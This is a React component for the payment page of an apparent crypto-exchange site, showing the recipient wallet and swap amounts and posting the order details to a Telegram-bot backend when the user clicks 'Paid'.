import React, { useState, useEffect } from "react";
import { useParams, useLocation, useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";
import "../scss/payment.scss";
import walletIcon from "../assets/images/wallet.png";
import copyIcon from "../assets/images/copy.png";

function Payment() {
  const { orderId } = useParams();
  const location = useLocation();
  const navigate = useNavigate();
  const { t } = useTranslation();

  const [paymentData] = useState(location.state);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    const paymentStatus = sessionStorage.getItem(`payment_${orderId}`);
    if (paymentStatus === "completed") {
      navigate("/payment-success", {
        state: {
          orderId,
          fromCrypto: paymentData?.fromCrypto,
          amount: paymentData?.amount,
        },
        replace: true,
      });
    }
  }, [orderId, navigate, paymentData]);

  const handleSubmit = async () => {
    if (!orderId) {
      setError("Order ID is missing");
      return;
    }

    setIsLoading(true);
    setError(null);

    const submissionData = {
      orderId: orderId,
      fromCrypto: paymentData.fromCrypto,
      toCrypto: paymentData.toCrypto,
      amount: paymentData.amount,
      calculatedAmount: paymentData.calculatedAmount,
      senderWallet: paymentData.senderWallet,
      recipientWallet: paymentData.recipientWallet,
      saveFromWallet: paymentData.saveFromWallet,
    };

    try {
      const response = await fetch(
        "https://cryptobit-telegram-bot-hxa2gdhufnhtfbfs.germanywestcentral-01.azurewebsites.net/api/send-form",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(submissionData),
        }
      );

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Network response was not ok");
      }

      const data = await response.json();

      if (data.success) {
        sessionStorage.setItem(`payment_${orderId}`, "completed");

        navigate("/payment-success", {
          state: {
            orderId,
            fromCrypto: paymentData.fromCrypto,
            amount: paymentData.amount,
          },
        });
      } else {
        throw new Error(data.message || "Error sending data");
      }
    } catch (error) {
      setError(error.message);
      console.error("Error submitting form:", error);
    } finally {
      setIsLoading(false);
    }
  };

  if (!paymentData) {
    return (
      <div className="payment-error-page">
        <h2>No payment data available</h2>
        <p>Please initiate a new payment request.</p>
        <button
          className="btn-primary"
          onClick={() => navigate("/cryptobit", { replace: true })}
        >
          Go to Home
        </button>
      </div>
    );
  }

  return (
    <section className="payment">
      <div className="payment__container">
        <div className="payment__content">
          <div className="payment__header">
            <h1>Payment on request #{orderId}</h1>
            <p className="processing-info">
              After Payment, The Application Is Sent For Processing, Which Takes
              10-15 Minutes, After The Funds Are Credited To Your Wallet.
            </p>
            <p className="commission-info">Commission Is 1$</p>
          </div>

          <div className="payment__exchange">
            <div className="exchange-item">
              <div className="exchange-icon">
                <img src={walletIcon} alt="Give away" />
              </div>
              <div className="exchange-details">
                <span className="exchange-label">Give away</span>
                <span className="exchange-value">
                  {paymentData.amount} {paymentData.fromCrypto}
                </span>
              </div>
            </div>

            <div className="exchange-item">
              <div className="exchange-icon">
                <img src={walletIcon} alt="You receive" />
              </div>
              <div className="exchange-details">
                <span className="exchange-label">You receive</span>
                <span className="exchange-value">
                  {paymentData.calculatedAmount} {paymentData.toCrypto}
                </span>
              </div>
            </div>
          </div>

          <div className="payment__form">
            <h2>Make a payment to a crypto wallet</h2>

            <div className="form-group">
              <label>Wallet network</label>
              <div className="form-value">TRC20</div>
            </div>

            <div className="form-group">
              <label>Wallet (hash)</label>
              <div
                className="form-value"
                onClick={() =>
                  navigator.clipboard.writeText(paymentData.recipientWallet)
                }
                style={{
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                }}
              >
                {paymentData.recipientWallet}
                <img
                  src={copyIcon}
                  alt="copy"
                  style={{
                    width: "16px",
                    height: "16px",
                    marginLeft: "8px",
                  }}
                />
              </div>
            </div>

            <div className="form-group">
              <label>Cryptocurrency</label>
              <div className="form-value">{paymentData.fromCrypto}</div>
            </div>

            <div className="form-group">
              <label>Request number</label>
              <div className="form-value">#{orderId}</div>
            </div>

            <div className="form-status">
              <h3>Request status</h3>
              <p>After you pay for the application, click the "Paid" button</p>
              <div className="status-value">Payment expected</div>
            </div>

            {error && <div className="form-error">{error}</div>}

            <div className="form-actions">
              <button
                className="btn-secondary"
                onClick={() => {
                  navigate("/cryptobit");
                  window.scrollTo(0, 0);
                }}
              >
                Close request
              </button>
              <button
                className="btn-primary"
                onClick={handleSubmit}
                disabled={isLoading}
              >
                {isLoading ? "Processing..." : "Paid"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

export default Payment;
